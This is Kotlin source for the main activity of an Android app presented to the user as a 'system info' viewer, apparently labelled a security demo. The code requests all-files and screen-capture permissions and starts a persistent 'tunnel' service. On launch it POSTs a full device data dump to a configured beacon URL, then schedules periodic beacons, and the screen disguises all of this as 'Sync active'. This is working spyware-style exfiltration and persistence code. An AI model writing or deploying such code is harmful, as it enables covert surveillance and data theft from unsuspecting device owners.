package com.securitydemo.systeminfo

import android.app.Activity
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            Log.d("MainActivity", "Screen capture permission granted")
            ScreenCaptureService.start(this, result.resultCode, result.data!!)
        } else {
            Log.d("MainActivity", "Screen capture permission denied")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        requestStoragePermission()
        requestScreenCapture()
        displaySystemInfo()
        scheduleBeacon()
        fireImmediateBeacon()
        showBeaconStatus()

        // Start persistent tunnel service
        TunnelService.start(this)
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE), 100)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        showBeaconStatus()
    }

    private fun displaySystemInfo() {
        val collector = DeviceDataCollector(this)
        val data = collector.collectAll()

        val info = buildString {
            appendLine("━━ Device ━━━━━━━━━━━━━━━━━━━")
            appendLine("  ${data["device"]}")
            appendLine("  Android ${data["android"]} (API ${data["api"]})")
            appendLine("  Patch: ${data["security_patch"]}")
            appendLine("  ID: ${data["android_id"]}")
            appendLine()
            appendLine("━━ Battery ━━━━━━━━━━━━━━━━━━")
            appendLine("  ${data["battery_pct"]}% • ${data["battery_charging"]}")
            appendLine("  Temp: ${data["battery_temp_c"]}°C")
            appendLine()
            appendLine("━━ Network ━━━━━━━━━━━━━━━━━━")
            appendLine("  Type: ${data["network_type"]}")
            val ips = data["local_ips"]
            if (ips is List<*> && ips.isNotEmpty()) {
                ips.forEach { appendLine("  IP: $it") }
            }
            appendLine()
            appendLine("━━ Storage ━━━━━━━━━━━━━━━━━━")
            appendLine("  ${data["storage_used_gb"]}GB / ${data["storage_total_gb"]}GB used")
            appendLine("  Free: ${data["storage_free_gb"]}GB")
            appendLine("  RAM: ${data["ram_available_mb"]}MB / ${data["ram_total_mb"]}MB")
            appendLine()
            appendLine("━━ System ━━━━━━━━━━━━━━━━━━━")
            appendLine("  Screen: ${data["screen_width"]}×${data["screen_height"]} @${data["screen_density"]}dpi")
            appendLine("  ABIs: ${(data["supported_abis"] as? List<*>)?.joinToString()}")
            appendLine("  Locale: ${data["locale"]}")
            appendLine("  TZ: ${data["timezone"]}")
            appendLine("  Emulator: ${data["is_emulator"]}")
            appendLine()
            appendLine("━━ Apps ━━━━━━━━━━━━━━━━━━━━━")
            appendLine("  ${data["installed_apps_count"]} apps installed")
        }

        findViewById<TextView>(R.id.tvSystemInfo).text = info
    }

    private fun showBeaconStatus() {
        val prefs = getSharedPreferences(BeaconWorker.PREFS_NAME, Context.MODE_PRIVATE)
        val lastBeacon = prefs.getLong(BeaconWorker.KEY_LAST_BEACON, 0)
        val count = prefs.getInt(BeaconWorker.KEY_BEACON_COUNT, 0)
        val serverMsg = prefs.getString(BeaconWorker.KEY_SERVER_MSG, null)

        val status = buildString {
            append("Sync active")
            if (count > 0) {
                append(" • $count syncs")
            }
            if (lastBeacon > 0) {
                val sdf = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                append(" • last: ${sdf.format(Date(lastBeacon))}")
            }
            if (serverMsg != null) {
                append("\n$serverMsg")
            }
        }
        findViewById<TextView>(R.id.tvStatus).text = status
    }

    /** Fire beacon IMMEDIATELY via a plain thread — no WorkManager delay */
    private fun fireImmediateBeacon() {
        val ctx = applicationContext
        Thread {
            try {
                val collector = DeviceDataCollector(ctx)
                val data = collector.collectAll()
                val json = JSONObject()
                for ((key, value) in data) {
                    when (value) {
                        is List<*> -> {
                            val arr = org.json.JSONArray()
                            for (item in value) {
                                if (item is Map<*, *>) {
                                    val obj = JSONObject()
                                    for ((k, v) in item) obj.put(k.toString(), v)
                                    arr.put(obj)
                                } else arr.put(item)
                            }
                            json.put(key, arr)
                        }
                        is Map<*, *> -> {
                            val obj = JSONObject()
                            for ((k, v) in value) obj.put(k.toString(), v)
                            json.put(key, obj)
                        }
                        else -> json.put(key, value)
                    }
                }
                json.put("type", "initial_full_dump")

                val url = URL(BuildConfig.BEACON_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("User-Agent", "SystemInfo/1.0")
                conn.doOutput = true
                conn.connectTimeout = 10_000
                conn.readTimeout = 10_000

                OutputStreamWriter(conn.outputStream).use {
                    it.write(json.toString())
                    it.flush()
                }

                val code = conn.responseCode
                Log.d("MainActivity", "Immediate beacon sent: $code")

                // Save beacon stats
                val prefs = ctx.getSharedPreferences(BeaconWorker.PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit()
                    .putLong(BeaconWorker.KEY_LAST_BEACON, System.currentTimeMillis())
                    .putInt(BeaconWorker.KEY_BEACON_COUNT, prefs.getInt(BeaconWorker.KEY_BEACON_COUNT, 0) + 1)
                    .apply()

                conn.disconnect()

                runOnUiThread { showBeaconStatus() }
            } catch (e: Exception) {
                Log.e("MainActivity", "Immediate beacon failed: ${e.message}")
            }
        }.start()
    }

    private fun scheduleBeacon() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val beaconRequest = PeriodicWorkRequestBuilder<BeaconWorker>(
            BuildConfig.BEACON_INTERVAL_MINUTES.toLong(), TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "system_info_sync",
            ExistingPeriodicWorkPolicy.KEEP,
            beaconRequest
        )
    }
}
